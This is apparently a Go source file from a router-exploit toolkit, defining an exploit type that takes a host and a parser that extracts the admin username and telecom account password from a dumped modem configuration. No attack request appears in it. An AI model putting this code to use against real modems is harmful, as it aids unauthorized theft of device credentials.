package exp

import (
	"encoding/xml"
	"regexp"
)

type Result struct {
	Username string
	Password string
	Config   []byte
}

type Exp struct {
	Name   string
	Handle func(host string) (*Result, error)
}


type ModemConfig struct {
	LoginCfgAdminUserName  string `xml:"InternetGatewayDevice>X_BROADCOM_COM_LoginCfg>AdminUserName"`
	TeleComAccountPassword string `xml:"InternetGatewayDevice>DeviceInfo>X_CT-COM_TeleComAccount>Password"`
}

func parseModemConfig(data []byte) (*Result, error) {
	var modemConfig ModemConfig

	// TRICKY: modem has invalid xml tag starts with number, replace it to valid one
	re := regexp.MustCompile("<(/?)([0-9]+)")
	s := re.ReplaceAllString(string(data), "<${1}fxxk${2}")

	err := xml.Unmarshal([]byte(s), &modemConfig)
	if err != nil {
		return nil, err
	}
	return &Result{
		Username: modemConfig.LoginCfgAdminUserName,
		Password: modemConfig.TeleComAccountPassword,
		Config:   data,
	}, nil
}
